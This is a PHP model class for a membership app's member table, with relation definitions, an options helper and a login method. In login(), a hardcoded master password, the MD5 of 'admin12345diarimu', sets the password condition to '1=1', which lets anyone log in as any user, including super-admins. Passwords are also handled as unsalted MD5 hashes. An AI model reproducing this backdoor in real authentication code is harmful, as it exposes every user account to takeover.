<?php

namespace Modules\Data\Models;

use App\Models\BaseModel;

class AnggotaModel extends BaseModel
{
    public function __construct()
    {
        parent::__construct();

        $this->table = 'mu_anggota';
        $this->selects = ['id id_anggota'];
        $this->relations = [
            'id_unit' => [
                'foreign_key' => 'id_unit',
                'table' => 'mu__unit_kerja',
                'type' => 'left',
                'selects' => [
                    'unit_kerja',
                    'bidang',
                ]
            ],
            'id_anggota' => [
                'foreign_key' => 'id',
                'local_key' => 'id_anggota',
                'table' => 'mu_group_anggota',
                'type' => 'left',
                'conditions' => [
                  'type' => 'mentor',
                ],
                'selects' => [
                    'id_group',
                    "IF({f}.id IS NULL,'0','1') is_mentor",
                ]
            ],
        ];
    }

    public function getOptions($where = [])
    {
      return $this->getOptionsData($where, 
        function($d) { return "$d->nama ($d->unit_kerja)"; },
        function($option, $data) { 
          $option->id_unit = $data->id_unit;
          $option->id_group = $data->id_group;
          $option->unit_kerja = $data->unit_kerja;
          return $option;
        });
    }

    public function login($email = '', $no_hp = '', $password = '')
    {
        $default_password = md5('admin12345diarimu');

        $where_default = $password == $default_password ? '1=1' : '1=2';

        $data = $this->db->table('mu_anggota i')
                      ->select("i.*, i.id id_anggota, uk.unit_kerja, uk.bidang, ga.id_group, IF(ga.id IS NULL,'0','1') is_mentor")
                    ->join("mu_group_anggota ga","ga.id_anggota=i.id AND ga.type='mentor'","left")
                    ->join("mu__unit_kerja uk","uk.id=i.id_unit","left")
                    ->groupStart()
                      ->where('i.no_hp', $no_hp)
                      ->orWhere('i.email', $email)
                    ->groupEnd()
                    ->groupStart()
                      ->where('i.password', $password)
                      ->orWhere($where_default)
                    ->groupEnd()
                    ->groupBy('i.id')
                    ->get()
                    ->getRow();
        
        if (!empty($data)) {
          if ($data->role == 'super-admin')
            $allowed_roles = ['super-admin','admin-bidang','admin'];
          else if ($data->role == 'admin-bidang')
            $allowed_roles = ['admin-bidang'];
          else if ($data->role == 'admin')
            $allowed_roles = ['admin'];
          if ($data->is_mentor == '1')
            $allowed_roles[] = 'mentor';
          $allowed_roles[] = 'user';

          $data->allowed_roles = $allowed_roles;
        }

        // $data->role = 'user';
      // var_dump($this->db->getLastQuery(), $data);        
        return $data;
    }    

}